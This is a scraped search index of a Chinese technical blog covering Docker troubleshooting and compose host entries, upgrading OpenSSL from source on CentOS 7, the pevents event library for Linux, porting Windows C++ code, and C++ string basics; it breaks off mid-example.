升级版本后无法启动Docker 升级版本后无法正常启动，使用命令 journalctl -u docker 查看系统日志信息，得到的错误信息如下： 1[graphdriver] prior storage driver devicemapper is deprecated and will be removed in a future release; update the the daemon configuration and explicitly choose this storage driver to continue using it; 创建或编辑 /etc/docker/daemon.json 配置文件，然后在配置文件内添加以下内容： 123{ "storage-driver": "devicemapper"} 再次重启 Docker 服务 1systemctl restart docker 参考资料 Docker storage drivers Use the Device Mapper storage driver Docker 查看容器的资源占用情况使用以下命令，可以查看 Docker 容器的 CPU、内存、网络资源占用情况。 12345# 查看所有容器# docker stats# 查看特定的容器# docker stats mysql Docker 容器添加自定义 Hosts为了向容器的 /etc/hosts 配置文件中添加一些记录，可以使用以下任意一种方式来实现。 Docker 启动容器时，添加 Hosts 1docker run --add-host=myhostname:10.180.8.1 --name test -it debian Docker-Compose 通过配置参数 extra_hosts 实现 1234567891011121314151617181920212223version: "3.5"services: pms: image: idoop/zentao:latest container_name: pms privileged: true ports: - 8080:80 - 3386:3306 environment: - ADMINER_USER=root - ADMINER_PASSWD=123456 - BIND_ADDRESS=false - SET_CONTAINER_TIMEZONE=true - CONTAINER_TIMEZONE=Asia/Shanghai volumes: - /etc/localtime:/etc/localtime:ro - /data/pms/:/opt/zbox/ restart: always extra_hosts: - "github.com:140.82.112.4" - "smtp.exmail.qq.com:113.96.208.92" Docker-Compose 的另一种写法，可能需要高版本的 Compose 才支持（例如 1.3 版本） 1234567891011121314151617181920212223version: "3.5"services: pms: image: idoop/zentao:latest container_name: pms privileged: true ports: - 8080:80 - 3386:3306 environment: - ADMINER_USER=root - ADMINER_PASSWD=123456 - BIND_ADDRESS=false - SET_CONTAINER_TIMEZONE=true - CONTAINER_TIMEZONE=Asia/Shanghai volumes: - /etc/localtime:/etc/localtime:ro - /data/pms/:/opt/zbox/ restart: always extra_hosts: - github.com: 140.82.112.4 - smtp.exmail.qq.com: 113.96.208.92 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化 开发随笔"},{title:"Centos7 升级 OpenSSL",url:"/posts/4ffdb5e1.html",text:'系统环境1Linux clay 3.10.0-1160.49.1.el7.x86_64 #1 SMP Tue Nov 30 15:51:32 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux 升级 OpenSSL 查看 OpenSSL 的版本 12# openssl versionOpenSSL 1.0.2k-fips 26 Jan 2017 备份旧版的 OpenSSL 12# mv /usr/bin/openssl /usr/bin/openssl.bak# mv /usr/include/openssl /usr/include/openssl-bak 安装依赖 1# yum install -y perl perl-devel perl-Test-Simple gcc gcc-c++ make 编译安装 注意事项 建议从 OpenSSL 官网 下载源码包，最新的稳定版本是 1.1.1 系列 ./config 命令必须加上 shared 参数，否则生成的 lib 目录里面只有 .a 静态库文件， 没有 .so 动态链接库文件 123456789101112131415161718192021222324252627# 下载文件# wget https://www.openssl.org/source/openssl-1.1.1m.tar.gz# 解压文件# tar -xvf openssl-1.1.1m.tar.gz# 进入解压目录# cd openssl-1.1.1m# 构建配置# ./config shared zlib --prefix=/usr/local/openssl# 编译# make -j4# 安装# make install# 添加动态链接库的路径到系统配置文件# echo "/usr/local/openssl/lib" &gt;&gt; /etc/ld.so.conf# 使配置生效# ldconfig -v# 链接文件# ln -sf /usr/local/openssl/bin/openssl /usr/bin/openssl# ln -sf /usr/local/openssl/include/openssl /usr/include/openssl 验证是否升级成功 12# openssl versionOpenSSL 1.1.1m 14 Dec 2021 升级后的维护更新 OpenSSL 后，需要排查系统的第三方服务是否以静态编译方式使用了 OpenSSL；如果第三方服务是静态编译的，则需要指定新的 OpenSSL 库重新进行编译，否则会影响服务的正常运行或者容易让其受到安全攻击。 提示 一般以静态编译方式使用了 OpenSSL 的第三方服务有：OpenSSH、Nginx、Apache，尤其当 Web 服务器支持 HTTPS 协议的时候 参考博客 Ubuntu16.04.4 升级 OpenSSL Centos8 OpenSSL 升级版本到最新 CentOS 如何升级 OpenSSL 到最新版本 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"Linux 实现 Windows 的 Event 事件机制",url:"/posts/c847598e.html",text:'前言 Linux 中没有 Windows 系统中的 CreateEvent()、WaitEvent()、SetEvent()、ResetEvent() 等函数，本文将介绍如何使用 pevents 替代 Linux 缺失的函数。 pevents 介绍 pevents 的简介pevents 是一个跨平台的轻量级 C++ 库，旨在为 POSIX 系统提供 WIN32 事件的实现。pevents 提供了 Windows 平台手动和自动重置事件的大部分功能，最显著的是支持同时等待多个事件（WaitForMultipleObjects），而且支持 Windows、FreeBSD、Linux、macOS、iOS、Android 等平台。 pevents 的 APIAPI 函数pevents 的 API 是根据 Windows 的 CreateEvent（）、WaitEvent（） 和 WaitForMultipleObjects（） 函数编写的，熟悉 WIN32 事件的开发人员应该可以将代码库切换到 pevents API。虚假唤醒是 Linux 下系统编程的正常部分，也是来自 Windows 世界的开发人员的常见陷阱，pevents 可以保证不存在虚假唤醒和等待返回的数据的正确性，其提供了如下的 API： 12345678910int SetEvent(neosmart_event_t event);int ResetEvent(neosmart_event_t event);int PulseEvent(neosmart_event_t event);int DestroyEvent(neosmart_event_t event);neosmart_event_t CreateEvent(bool manualReset, bool initialState);int WaitForEvent(neosmart_event_t event, uint64_t milliseconds);int WaitForMultipleEvents(neosmart_event_t *events, int count, bool waitAll, uint64_t milliseconds);int WaitForMultipleEvents(neosmart_event_t *events, int count, bool waitAll, uint64_t milliseconds, int &amp;index); 事件状态的类型 CreateEvent() 函数 1234567neosmart_event_t CreateEvent( // true：表示手动，在 WaitEvent 后需要手动调用 ResetEvent 清除事件信号。false：表示自动，在 WaitEvent 后，系统会自动清除事件信号 bool manualReset, // 初始状态，false 为无信号，true 为有信号 bool initialState); WaitForEvent() 函数 123456int WaitForEvent( // 句柄对象 neosmart_event_t event, // 等待的时间（毫秒） uint64_t milliseconds); 事件状态的类型 WAIT_TIMEOUT：等待超时 WAIT_OBJECT_0：句柄对象处于有信号状态 WAIT_FAILED：出现错误，可通过 GetLastError() 函数得到错误码 WAIT_ABANDONED：说明句柄代表的对象是个互斥对象，并且正在被其它线程占用 注意 在 Linux 平台，pevents 的事件状态只支持使用 WAIT_TIMEOUT，且有信号的时候 WaitEvent() 函数的返回值是 0，而在 Windows 平台则支持上述四种事件状态 pevents 的项目结构 核心代码在 src/ 目录 单元测试代码（通过 Meson 构建）在 test/ 目录 在 examples/ 目录中可以找到演示 pevents 用法的跨平台应用示例程序 pevents 的编译构建pevents 使用的构建工具是 Meson，目前这仅用于支持 pevents 核心代码及其单元测试的自动化构建 / 测试。值得一提的是，开发人员不需要担心构建工具的差异性，pevents 是特意基于 C/C++ 标准编写的，避免了复杂的配置或依赖于平台的构建指令的需要。 pevents 的编译参数通过编译参数 -DWFMO 与 -DPULSE，可以在编译时让 pevents 启用不同的功能： WFMO：启用 WFMO 功能，如果需要使用 WaitForMultipleEvents() 函数，建议仅使用 WFMO 进行编译，因为它会为所有事件对象增加开销（较小）。 PULSE：启用 PulseEvent 功能，PulseEvent() 在 Windows 平台从根本上被破坏了，一般不应该被使用，当你调用它时，它几乎永远不会做你认为你正在做的事情。pevents 包含这个函数只是为了让现有的（有缺陷的）代码从 WIN32 移植到 Unix/Linux 平台更容易，并且这个函数默认没有编译到 pevents 中。 Meson 指定编译参数在 Meson 中，可以通过 meson_options.txt 配置文件指定编译参数，让 pevents 启用不同的功能 1234option(\'wfmo\', type: \'boolean\', value: true, description: \'Enable WFMO events\')option(\'pulse\', type: \'boolean\', value: false, description: \'Enable PulseEvent() function\') CMake 指定编译参数在 CMake 中，可以通过 CMakeLists.txt 配置文件指定编译参数，让 pevents 启用不同的功能 1set(CMAKE_CXX_FLAGS "-std=c++11 -lpthread -DWFMO") pevents 运行示例代码提示 值得一提的是，pevents 的核心 C++ 源文件是 pevents.h、pevents.cpp 1234567891011121314151617# 拉取代码$ git clone git@github.com:clay-world/pevents.git# 进入源码目录$ cd pevents# 生成构建的输出目录$ meson build# 进入构建的输出目录$ cd build# 编译代码$ ninja# 运行示例程序$ ./sample pevents 的实战案例编译说明下面给出的案例使用了 pthread，由于 pthread 不是 Linux 系统默认的库，因此链接时需要使用静态库 libpthread.a。简而言之，在使用 pthread_create() 创建线程，以及调用 pthread_atfork() 函数建立 fork 处理程序时，需要通过 -lpthread 参数链接该库，同时还需要在 C++ 源文件里添加头文件 pthread.h。 提示 为了可以正常编译使用了 pthread 的项目代码，不同构建工具的使用说明如下： 若使用 G++ 编译 C++ 项目，则编译命令的示例如下： 12# 编译代码$ g++ main.cpp -o main -lpthread 若使用 CMake 构建 C++ 项目，则 CMakeLists.txt 配置文件的示例内容如下： 123set(CMAKE_CXX_FLAGS "-std=c++11 -lpthread -DWFMO")add_executable(main main.cpp) 实战案例一CreateEvent(true, true) - 手动清除事件信号，初始状态为有信号，点击下载 基于 CMake 构建的完整案例代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;iostream&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;#include "pevents.h"using namespace std;using namespace neosmart;neosmart_event_t g_hEvent = NULL;void printIds(const char *s) { pid_t pid = getpid(); pthread_t tid = pthread_self(); printf("%s pid %u tid %u (0x%x)\\n", s, (unsigned int) pid, (unsigned int) tid, (unsigned int) tid);}void *procFunc1(void *args) { printIds("thread-1"); if (WaitForEvent(g_hEvent, 1) == 0) { cout &lt;&lt; "thread-1 is working..." &lt;&lt; endl; } return ((void *) 0);}void *procFunc2(void *args) { printIds("thread-2"); if (WaitForEvent(g_hEvent, 1) == 0) { cout &lt;&lt; "thread-2 is working..." &lt;&lt; endl; } return ((void *) 0);}int main() { // 手动清除事件信号，初始状态为有信号 g_hEvent = CreateEvent(true, true); pthread_t ntid1; pthread_create(&amp;ntid1, NULL, procFunc1, NULL); sleep(1); pthread_t ntid2; pthread_create(&amp;ntid2, NULL, procFunc2, NULL); sleep(5);} 程序运行的结果如下： 1234thread-1 pid 62705 tid 2336241408 (0x8b403700)thread-1 is working...thread-2 pid 62705 tid 2327848704 (0x8ac02700)thread-2 is working... 提示 可以看到线程 1 和线程 2 都完整执行了，这是因为创建的事件是需手动 Reset 才会变为无信号的，所以执行完线程 1 后事件仍处于有信号的状态，所以线程 2 的逻辑才会被继续执行。 实战案例二CreateEvent(false, true) - 自动清除事件信号，且初始状态为有信号，点击下载 基于 CMake 构建的完整案例代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;iostream&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;#include "pevents.h"using namespace std;using namespace neosmart;neosmart_event_t g_hEvent = NULL;void printIds(const char *s) { pid_t pid = getpid(); pthread_t tid = pthread_self(); printf("%s pid %u tid %u (0x%x)\\n", s, (unsigned int) pid, (unsigned int) tid, (unsigned int) tid);}void *procFunc1(void *args) { printIds("thread-1"); if (WaitForEvent(g_hEvent, 1) == 0) { cout &lt;&lt; "thread-1 is working..." &lt;&lt; endl; } return ((void *) 0);}void *procFunc2(void *args) { printIds("thread-2"); if (WaitForEvent(g_hEvent, 1) == 0) { cout &lt;&lt; "thread-2 is working..." &lt;&lt; endl; } return ((void *) 0);}int main() { // 自动清除事件信号，初始状态为有信号 g_hEvent = CreateEvent(false, true); pthread_t ntid1; pthread_create(&amp;ntid1, NULL, procFunc1, NULL); sleep(1); pthread_t ntid2; pthread_create(&amp;ntid2, NULL, procFunc2, NULL); sleep(5);} 程序运行的结果如下： 123thread-1 pid 59685 tid 2245932800 (0x85de3700)thread-1 is working...thread-2 pid 59685 tid 2237540096 (0x855e2700) 提示 可以看到只有线程 1 完整执行了，这是由于事件在执行完线程 1 后被系统自动重置为无信号，所以线程 2 中的逻辑没有被执行。 实战案例三CreateEvent(true, false) - 手动清除事件信号，初始状态为无信号，包括 SetEvent（） 与 ResetEvent() 的使用，点击下载 基于 CMake 构建的完整案例代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &lt;iostream&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;#include "pevents.h"using namespace std;using namespace neosmart;neosmart_event_t g_hEvent = NULL;void printIds(const char *s) { pid_t pid = getpid(); pthread_t tid = pthread_self(); printf("%s pid %u tid %u (0x%x)\\n", s, (unsigned int) pid, (unsigned int) tid, (unsigned int) tid);}void *procFunc1(void *args) { printIds("thread-1"); if (WaitForEvent(g_hEvent, 1) == 0) { cout &lt;&lt; "thread-1 is working..." &lt;&lt; endl; } // 重置事件为无信号 ResetEvent(g_hEvent); return ((void *) 0);}void *procFunc2(void *args) { printIds("thread-2"); if (WaitForEvent(g_hEvent, 1) == 0) { cout &lt;&lt; "thread-2 is working..." &lt;&lt; endl; } return ((void *) 0);}void func1() { // 手动清除事件信号，初始状态为有信号 g_hEvent = CreateEvent(true, true); pthread_t ntid1; pthread_create(&amp;ntid1, NULL, procFunc1, NULL); sleep(1); pthread_t ntid2; pthread_create(&amp;ntid2, NULL, procFunc2, NULL); sleep(5);}int main() { // 手动清除事件信号，初始状态为无信号 g_hEvent = CreateEvent(true, false); // 设置事件为有信号 SetEvent(g_hEvent); pthread_t ntid1; pthread_create(&amp;ntid1, NULL, procFunc1, NULL); sleep(1); pthread_t ntid2; pthread_create(&amp;ntid2, NULL, procFunc2, NULL); sleep(5); return 0;} 程序运行的结果如下： 123thread-1 pid 70368 tid 2745513728 (0xa3a53700)thread-1 is working...thread-2 pid 70368 tid 2737121024 (0xa3252700) 提示 可以看到只有线程 1 完整执行了，这是因为线程 1 在执行之前事件是有信号的，执行完成后事件被手动重置为无信号，所以线程 2 中的逻辑没有被执行。 参考资料 C++ 的 CreateEvent () WaitForSingleObject 和 WaitForMultipleObject 事件 SetEvent、ResetEvent、WaitForSingleObject 与 CreateEvent 详解 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++ linux系统编程"},{title:"Linux 移植 Windows 的 C++ 代码",url:"/posts/15f45d12.html",text:'conio.h 头文件移植简述conio.h 不是 C 标准库中的头文件，在 ISO 和 POSIX 标准中均没有定义。conio 是 Console Input/Output（控制台输入输出）的简写，其中定义了通过控制台进行数据输入和数据输出的函数，主要是一些用户通过按键盘产生的对应操作，比如 getch() 函数等等。大部分 DOS、Windows、Phar Lap、DOSX，OS/2 等平台上的 C 编译器提供了此头文件，UNIX 和 Linux 平台的 C 编译器本身通常不包含此头文件。另外在项目开发中，平时主要是使用 conio.h 这个头文件中的 getch() 函数，即读取键盘字符但是不显示出来（without echo)，但是含有 conio.h 的代码在 Linux 下无法直接编译通过，因为 Linux 没有这个头文件。但 Linux 平台下完全可以使用 ncurses 替代 conio.h 头文件，ncurses 支持的 API 可以阅读 官方文档。值得一提的是，ncurses 在 Linux 平台实现了 getch()、scanw()、getstr() 等函数。 安装依赖提示 由于 ncurses 不是 Linux 系统默认的库，因此需要安装后才能使用，不同平台的安装命令如下： CentOS/Fedora 1# yum install -y ncurses ncurses-devel Debian/Ubuntu 1# apt-get install -y libncurses5-dev libncursesw5-dev 案例代码提示 ncurses.h 与 curses.h 这两个头文件是等价的 12345678910#include &lt;iostream&gt;#include &lt;ncurses.h&gt;using namespace std;int main() { cout &lt;&lt; ("Hello Wolrd!") &lt;&lt; endl; getch(); return 0;} 编译说明由于 ncurses 不是 Linux 系统默认的库，因此编译时需要链接到该库，同时还需要在 C++ 的源文件里添加头文件 ncurses.h，否则编译会失败。 提示 为了可以正常编译使用了 ncurses 的项目代码，不同构建工具的使用说明如下： 若使用 G++ 编译 C++ 项目，则编译命令的示例如下： 12# 编译代码$ g++ main.cpp -o main -lncurses 若使用 CMake 构建 C++ 项目，则 CMakeLists.txt 配置文件的示例内容如下： 123set(CMAKE_CXX_FLAGS "-std=c++11 -lncurses")add_executable(main main.cpp) itoa () 函数移植简述在 Window 平台里，itoa() 函数可以将整数转换为字符串，其函数的原型如下。Linux 平台中只有 atoi() 函数，并没有对应的 itoa() 函数，但可以使用 sprintf() 或者 snprintf() 函数替代，建议使用更安全的 snprintf()。 itoa () 函数 函数原型：char *itoa( int value, char *string,int radix) 函数功能：将整数 value 转换成字符串存入 string 指向的内存空间，radix 为转换时所用基数 (保存到字符串中的数据的进制基数) 函数的参数：value：转换的数据，string：目标字符串的地址，radix：转换后的进制数，可以是 10 进制、16 进制等，范围必须在 2-36 之间 snprintf () 函数 头文件：#include &lt;stdio.h&gt; 函数原型：int snprintf(char *str, size_t size, const char *format, ...) 函数功能：将可变参数 ... 按照 format 格式化成字符串，然后将其复制到 str 中 函数参数：str：目标字符串，size：拷贝字节数（Bytes），format：格式化字符串，... 可变参数 案例代码1234567891011#include &lt;iostream&gt;using namespace std;int main() { int num = 12; char str[4]; int size = snprintf(str, 4, "%d", num); cout &lt;&lt; "str = " &lt;&lt; str &lt;&lt; ", size = " &lt;&lt; size &lt;&lt; endl; return 0;} 程序运行的输出结果如下： 1str = 12, size = 2 strcpy_s () 函数相关站点 Safe C Library 的下载页面 Safe C Library 的官方文档 Safe C Library 的 GitHub 项目 移植简述在 Window 平台上，strcpy_s() 函数存在于 #include &lt;cstring&gt; 头文件中。Linux 平台没有该函数，但可以使用 Safe C Library 替代实现。Safe C Library 这个库是在 libc 的基础之上实现了安全的 C11 Annex K 函数，这些函数是它们所缺少的，可以帮助缓解不断增加的安全攻击，特别是缓冲区溢出。 安装依赖提示 由于 Safe C Library 不是 Linux 系统默认的库，因此需要安装后才能使用，其默认的安装目录如下 /usr/local/lib/：包含静态库和动态链接库文件 /usr/local/include/libsafec：包所有含头文件 1234567891011121314151617# 下载文件（这里下载的不是源码压缩包）# wget https://github.com/rurban/safeclib/releases/download/v02092020/libsafec-02092020.tar.gz# 解压文件# tar -xvf libsafec-02092020.tar.gz# 进入解压目录# cd libsafec-02092020.0-g6d921f# 配置# ./configure# 编译# make -j4# 安装# make install 值得一提的是，Safe C Library 编译后会单独生成静态库文件 /usr/local/lib/libsafec-3.6.0.a 和动态链接库文件 /usr/local/lib/libsafec-3.6.0.so.3.0.6，其中的 3.6.0 是指版本号。 案例代码提示 strcpy_s() 函数在 Safe C Library 里的 safe_str_lib.h 头文件中声明 123456789101112#include &lt;iostream&gt;#include &lt;libsafec/safe_str_lib.h&gt;using namespace std;int main() { char *str = new char[5]; strcpy_s(str, 5, "abcd"); cout &lt;&lt; str &lt;&lt; endl; delete[] str; return 0;} 编译说明由于 Safe C Library 不是 Linux 系统默认的库，因此编译时需要链接到该库，同时还需要在 C++ 的源文件里添加头文件 &lt;libsafec/safe_str_lib.h&gt;，否则编译会失败。 提示 为了可以正常编译使用了 Safe C Library 的项目代码，不同构建工具的使用说明如下所示 可以将上面构建生成的 libsafec-3.6.0.a 静态库文件和 .h 头文件都拷贝到项目里，这样就可以方便在不同的 Linux 系统编译和运行项目，不用每次切换系统时都要重新安装 Safe C Library 若使用 G++ 编译 C++ 项目，则编译命令的示例如下，请自行更改库文件的版本号： 12345# 编译代码$ g++ main.cpp -o main -L/usr/local/lib/ -l:libsafec-3.6.0.a# "-L" 参数指定了库文件的目录路径# "-l:" 参数指定了库文件的文件名 若使用 CMake 构建 C++ 项目，则 CMakeLists.txt 配置文件的示例内容如下，请自行更改库文件的版本号： 123link_libraries(/usr/local/lib/libsafec-3.6.0.a)add_executable(windows_to_linux main.cpp) 函数可变参数宏移植简述在 Windows 平台与 Linux 平台，函数可变参数宏定义的语法是不一样的。 案例代码 Windows 平台的函数可变参数宏定义的写法如下，使用的是 __VA_ARGS__ 12FILE* logfile = fopen("syslog.txt", "w");#define LOG(format, ...) fprintf(logfile, format, __VA_ARGS__); printf(format, __VA_ARGS__); fflush(logfile); Linux 平台的函数可变参数宏定义写法如下，使用的是 ##__VA_ARGS__ 12FILE* logfile = fopen("syslog.txt", "w");#define LOG(format, ...) fprintf(logfile, format, ##__VA_ARGS__); printf(format, ##__VA_ARGS__); fflush(logfile); var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++ linux系统编程"},{title:"C++ 进阶基础之六",url:"/posts/62e4578b.html",text:'大纲 C++ 进阶基础之一、C++ 进阶基础之二、C++ 进阶基础之三 C++ 进阶基础之四、C++ 进阶基础之五、C++ 进阶基础之六 C++ 进阶基础之七、C++ 进阶基础之八 string 容器string 容器的概念string 是 STL 的字符串类型，通常用来表示字符串。而在使用 string 之前，字符串通常是用 char* 表示的。string 与 char* 都可以用来表示字符串，两者的区别如下： string 是一个类，char* 是一个指向字符的指针 string 封装了 char* 来管理字符串，本质是一个 char* 类型的容器 string 不用考虑内存释放和越界的问题 string 负责管理 char* 所分配的内存。每一次 string 的复制，取值都由 string 类负责维护，不用担心复制越界和取值越界等问题 string 提供了一系列的字符串操作函数，例如：查找（find）、拷贝（copy）、删除（erase）、替换（replace）、插入（insert） stirng 容器的 API构造函数 默认构造函数：string(); 带参数的构造函数： string(const char *s);，用字符串 s 初始化 string(int n, char c);，用 n 个字符 c 初始化 拷贝构造函数：string(const string &amp;str); string 的长度 size_t size() const，返回当前字符串的长度，这里的长度不包括字符串的结尾的 \\0 字符 size_t length() const;，返回当前字符串的长度，这里的长度不包括字符串的结尾的 \\0 字符 bool empty() const;，判断当前字符串是否为空 值得一提的是，sizeof() 返回的是对象所占用空间的字节数，strlen() 返回的是字符数组中第一个 \\0 前的字节数，string 的成员函数 size() 和 length() 没有任何区别。 string 的赋值 string &amp;operator=(const string &amp;s);，把字符串 s 赋给当前的字符串 string &amp;assign(const char *s);，把字符串 s 赋给当前的字符串 string &amp;assign(const char *s, int n);，把字符串 s 的前 n 个字符赋给当前的字符串 string &amp;assign(const string &amp;s);，把字符串 s 赋给当前字符串 string &amp;assign(int n, char c);，用 n 个字符 c 赋值给当前字符串 string &amp;assign(const string &amp;s, int start, int n);，把字符串 s 中从 start 开始的 n 个字符赋值给当前字符串 string 的子串 string substr(int pos=0, int n=npos) const;，返回由 pos 位置开始的 n 个字符组成的子字符串 string 的查找 int find(char c, int pos=0) const;，从 pos 位置开始查找字符 c 在当前字符串第一次出现的位置 int find(const char *s, int pos=0) const;，从 pos 位置开始查找字符串 s 在当前字符串第一次出现的位置 int find(const string &amp;s, int pos=0) const;，从 pos 位置开始查找字符串 s 在当前字符串第一次出现的位置 int rfind(char c, int pos=npos) const;，从 pos 位置开始查找字符 c 在当前字符串中最后一次出现的位置 int rfind(const char *s, int pos=npos) const;，从 pos 位置开始查找字符串 s 在当前字符串中最后一次出现的位置 int rfind(const string &amp;s, int pos=npos) const;，从 pos 位置开始查找字符串 s 在当前字符串中最后一次出现的位置 值得一提的是，当 find() 与 rfind() 函数查找不到时，都会返回 -1；两者不同的是 find() 是正向查找，而 rfind() 是逆向查找，但是最终两个函数返回的位置均是字符 / 字符串出现的正向位置；若有重复字符 / 字符串时，则 rfind() 返回的是逆向查找到的字符 / 字符串在正向的位置（即最后一次出现的正向位置）。 string 的替换 string &amp;replace(int pos, int n, const char *s);，删除从 pos 位置开始的 n 个字符，然后在 pos 位置插入字符串 s string &amp;replace(int pos, int n, const string &amp;s);，删除从 pos 位置开始的 n 个字符，然后在 pos 位置插入字符串 s void swap(string &amp;s2);，交换当前字符串与字符串 s2 的值 string 的比较 int compare(const string &amp;s) const;，与字符串 s 比较 int compare(const char *s) const;，与字符串 s 比较 compare() 函数的结果在 &gt; 时返回 1，&lt; 时返回 -1，= 时返回 0。字符串比较区分大小写，比较时参考字典顺序，排越前面的越小。大写的 A（65） 比小写的 a（97） 小。 string 的字符存储 char &amp;at(int n); char &amp;operator[] (int n); operator[] 和 at() 均返回当前字符串中的第 n 个字符，但二者是有区别的 at() 在越界时会抛出异常，[] 在刚好越界时会返回 (char)0，再继续越界时，程序异常终止 如果程序希望可以通过 try catch 捕获异常，则建议采用 at() string 的区间插入 string &amp;insert(int pos, const char *s);，在 pos 位置插入字符串 s，返回修改后的字符串 string &amp;insert(int pos, const string &amp;s);，在 pos 位置插入字符串 s，返回修改后的字符串 string &amp;insert(int pos, int n, char c);，在 pos 位置插入 n 个字符 c，返回修改后的字符串 string 的区间删除 string &amp;erase(int pos=0, int n=npos);，删除从 pos 位置开始的 n 个字符，返回修改后的字符串 string 的字符串拼接 string &amp;operator+=(const string &amp;s);，把字符串 s 连接到当前字符串的结尾 string &amp;operator+=(const char *s);，把字符串 s 连接到当前字符串的结尾 string &amp;append(const char *s); ，把字符串 s 连接到当前字符串的结尾 string &amp;append(const char *s, int n);，把字符串 s 的前 n 个字符连接到当前字符串的结尾 string &amp;append(const string &amp;s); ，把字符串 s 连接到当前字符串的结尾 string &amp;append(const string &amp;s, int pos, int n);，把字符串 s 中从 pos 位置开始的 n 个字符连接到当前字符串的结尾 string &amp;append(int n, char c); ，在当前字符串的结尾添加 n 个字符 c 从 string 取得 char* const char *c_str() const;，返回一个以 \\0 结尾的字符串的首地址 值得一提的是，char * 可以隐式转换为 string 类型，反过来则不可以，例如右边这种写法是合法的： char *p = "abc"; string str = p; 将 string 拷贝到 char* 指向的内存空间 int copy(char *s, int n, int pos=0) const; 将当前串中以 pos 位置开始的 n 个字符拷贝到以 s 为起始位置的字符数组中，返回实际拷贝的字符数量。特别注意，要保证指针 s 所指向的内存空间足以容纳当前的字符串，不然可能会发生越界。 string 容器的常用操作 string 容器的构造与赋值 123456789101112131415161718192021222324252627#include &lt;iostream&gt;using namespace std;int main() { // 默认构造函数 string str1; // 拷贝构造函数 string str2 = str1; // 有参构造函数 string str3("abced"); string str4(5, \'f\'); // 基本赋值 str1 = "123456"; str2 = str3; str3.assign("mnopq", 3); str4.assign("45678", 1, 3); // 从0开始索引，1表示第2个字符 cout &lt;&lt; "str1 = " &lt;&lt; str1 &lt;&lt; endl; cout &lt;&lt; "str2 = " &lt;&lt; str2 &lt;&lt; endl; cout &lt;&lt; "str3 = " &lt;&lt; str3 &lt;&lt; endl; cout &lt;&lt; "str4 = " &lt;&lt; str4 &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 1234str1 = 123456str2 = abcedstr3 = mnostr4 = 567 string 容器的 API 调用 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#include &lt;iostream&gt;using namespace std;int main() { // 存储字符 string str1 = "abcde"; for (int i = 0; i &lt; str1.size(); i++) { // 第一种方式 cout &lt;&lt; str1[i] &lt;&lt; " "; // 第二种方式 // cout &lt;&lt; str1.at(i) &lt;&lt; " "; } cout &lt;&lt; endl; // 字符串拼接 string str2 = "hello "; string str3 = "world "; str2 += str3; str3.append("where"); cout &lt;&lt; "str2 = " &lt;&lt; str2 &lt;&lt; endl; cout &lt;&lt; "str3 = " &lt;&lt; str3 &lt;&lt; endl; // 字符串查找 string str4 = "My name is Peter"; int index1 = str4.find("name"); cout &lt;&lt; "index1 = " &lt;&lt; index1 &lt;&lt; endl; int index2 = str4.rfind("e"); cout &lt;&lt; "index2 = " &lt;&lt; index2 &lt;&lt; endl; // 字符串替换 string str5 = "abc123"; str5.replace(3, 3, "def"); cout &lt;&lt; "str5 = " &lt;&lt; str5 &lt;&lt; endl; string str6 = "123456"; string str7 = "654321"; str6.swap(str7); cout &lt;&lt; "str6 = " &lt;&lt; str6 &lt;&lt; endl; // 字符串比较 string str8 = "ABC"; string str9 = "abc"; int result = str8.compare(str9); // 返回值小于等于-1 cout &lt;&lt; "result = " &lt;&lt; result &lt;&lt; endl; // 截取子字符串 string str10 = "124abc"; string str11 = str10.substr(1, 